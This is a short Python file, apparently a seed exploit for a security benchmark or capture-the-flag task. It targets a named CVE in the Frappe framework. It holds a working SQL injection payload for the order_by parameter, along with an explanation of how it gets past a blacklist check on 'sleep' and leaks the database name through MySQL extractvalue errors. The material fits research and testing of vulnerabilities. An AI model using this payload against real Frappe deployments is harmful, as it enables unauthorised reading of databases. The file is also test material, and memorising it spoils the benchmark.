#!/usr/bin/env python3
"""[GIVEN] CVE-2025-52895 seed exploit for frappe-cve-2025-55732.

order_by injection in frappe/model/db_query.py. The blacklisted `sleep` token is
placed inside a wrapper expression so the PRE-'(' token is `1 and sleep` (not
exactly `sleep`). On v0 the exact-match check `if function in {"sleep"}` lets it
through; on v1 the CVE-2025-52895 substring check `any("sleep" in function)`
catches it. The `extractvalue(1,concat(0x7e,database()))` piece error-exfils the
protected schema identifier (the flag) via the MySQL XPATH error message.

  reaches flag on v0 (guard passes, extractvalue leaks) · BLOCKED on v1 (sleep token caught)
"""


def candidate() -> dict:
    return {
        "probe_id": "orig-cve-2025-52895",
        # `sleep` sits in the pre-'(' token => differential vs the v1 substring check.
        # `or extractvalue(...,database())` forces the error-based read of the schema name.
        # 0x7e == '~' keeps the payload within ORDER_GROUP_PATTERN's allowed charset.
        "order_by": "1 and sleep(0) or extractvalue(1,concat(0x7e,database()))",
    }
